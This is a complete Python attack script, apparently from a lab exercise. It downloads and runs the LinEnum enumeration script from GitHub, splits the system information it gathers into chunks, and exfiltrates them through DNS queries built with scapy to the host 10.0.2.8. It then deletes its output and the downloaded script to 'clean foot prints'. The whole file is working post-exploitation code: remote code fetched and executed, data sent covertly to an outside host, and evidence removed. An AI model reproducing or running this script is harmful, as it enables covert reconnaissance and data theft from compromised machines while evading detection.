#!/usr/bin/env python3.8
#Libraries:
import subprocess
import requests
import os
import stat
import sys
from scapy.sendrecv import send
from scapy.layers.inet import IP,UDP
from scapy.layers.dns import DNS , DNSQR
#--------------------------------------------------------------------------------------------
#Script:
dst_IP = '10.0.2.8'
output = ""
print("Getting Enum code from web.")
file_name = "Enum.sh"
url = "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"
session = requests.session()
respond = session.get(url)
#print(respond.text)
print("Create shell script and set permitions")
file = open(file_name,"a+")
file.write(respond.text)
st = os.stat(file_name)
os.chmod(file_name, st.st_mode | stat.S_IEXEC)
print("Script is running...")
print("Gathering information.")
with open('out.txt', 'w+') as fout:
        out = subprocess.call(['sh', './Enum.sh'],stdout=fout)
        # reset file to read from it
        fout.seek(0)
        # save output (if any) in variable
        output = fout.read()
n = 10000 # chunk length
print("The scan is ended.")
print("Seperate the information to chunks")
chunks = [output[i:i+n] for i in range(0, len(output), n)]
print("Sending chunks via DNS Tunneling.")
for i in range(len(chunks)):	
	dns_req = IP(dst=dst_IP)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=chunks[i]))
	answer = send(dns_req, verbose=0)
	print("\tchunk #"+str(i)+" sent")
print("Clean foot prints...")
os.remove("out.txt")
os.remove("Enum.sh")
